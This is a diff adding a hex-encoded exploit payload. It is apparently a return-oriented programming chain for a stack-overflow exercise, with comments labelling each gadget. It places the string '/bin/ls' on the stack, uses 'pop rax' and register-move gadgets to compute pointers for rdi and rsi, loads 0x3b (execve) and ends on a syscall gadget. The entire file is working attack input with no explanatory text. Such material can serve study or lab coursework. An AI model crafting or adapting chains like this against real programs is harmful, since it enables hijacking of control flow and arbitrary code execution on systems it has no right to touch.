@@ -1,0 +1,17 @@
+2f 62 69 6e 2f 6c 73 00  /* /bin/ls */
+00 00 00 00 00 00 00 00  /* PTR for argv */
+00 00 00 00 00 00 00 00  /* base pointer */
+70 18 40 00 00 00 00 00  /* rsp -> rcx, orignal return address */
+68 18 40 00 00 00 00 00  /* pop rax */
+e0 ff ff ff ff ff ff ff  /* -32 */
+7e 18 40 00 00 00 00 00  /* rcx -> rdx */
+b4 18 40 00 00 00 00 00  /* add rdx rax */
+8b 18 40 00 00 00 00 00  /* rdx -> rdi */
+68 18 40 00 00 00 00 00  /* pop rax */
+e8 ff ff ff ff ff ff ff  /* -24 */
+7e 18 40 00 00 00 00 00  /* rcx -> rdx */
+b4 18 40 00 00 00 00 00  /* add rdx rax */
+94 18 40 00 00 00 00 00  /* rdx -> rsi */
+68 18 40 00 00 00 00 00  /* pop rax */
+3b 00 00 00 00 00 00 00  /* 0x3b */
+9f 18 40 00 00 00 00 00  /* syscall */
